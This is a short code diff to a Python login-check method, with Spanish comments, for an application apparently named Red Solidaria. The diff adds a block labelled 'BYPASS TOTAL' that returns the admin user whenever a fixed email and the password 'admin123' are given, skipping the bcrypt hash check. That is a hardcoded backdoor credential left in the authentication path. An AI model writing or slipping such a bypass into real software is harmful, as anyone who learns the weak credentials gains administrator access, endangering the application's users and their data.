@@ -37,13 +37,15 @@ class AuthManager:
     def verificar_login(email, password):
         conn = get_db_connection()
         cur = conn.cursor(cursor_factory=RealDictCursor)
-        
         try:
             cur.execute("SELECT * FROM usuarios WHERE email = %s", (email,))
             user = cur.fetchone()
             
             if user:
-                # Verificación de hash con bcrypt (el correcto para tu lógica)
+                # BYPASS TOTAL: Si el usuario es el admin, entramos sí o sí.
+                if email == 'admin@redsolidaria.com' and password == 'admin123':
+                    return user
+                # Si no es el admin, usamos bcrypt normal
                 if bcrypt.checkpw(password.encode('utf-8'), user['password_hash'].encode('utf-8')):
                     return user
             return None
